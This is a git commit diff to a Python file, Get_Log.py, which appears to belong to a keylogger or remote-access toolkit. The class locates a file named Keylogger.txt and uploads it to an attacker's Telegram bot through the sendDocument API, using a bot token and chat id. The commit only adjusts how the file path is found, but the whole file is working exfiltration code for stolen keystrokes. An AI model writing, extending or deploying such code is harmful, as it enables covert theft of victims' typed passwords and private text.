4cb9f53421230c38ce404bccafb6f31d03415dd7
UQABXO <92090431+UQABXO@users.noreply.github.com>
2022-04-06 12:48:49 +0300

    Update Get_Log.py

--- Get_Log.py
+++ Get_Log.py
@@ -2,13 +2,14 @@ import os
 import requests
 class Get_Log():
 	def __init__(self, _):
+		self.__file__ = _.__file__
 		self.token = _.token
 		self.chat_id = _.chat_id
 		self.Send_Message = _.Send_Message
 		self.Main()
 
 	def Main(self):
-		filename = "\\".join(os.path.abspath(__file__).split("\\")[:-2]) + "\\Keylogger.txt"
+		filename = "\\".join(os.path.abspath(self.__file__).split("\\")[:-2]) + "\\Keylogger.txt"
 		if os.path.exists(filename):
 			file = open(filename, "r")
 			requests.get('https://api.telegram.org/bot' + self.token + '/sendDocument?chat_id=' + self.chat_id, files = {'document' : file})
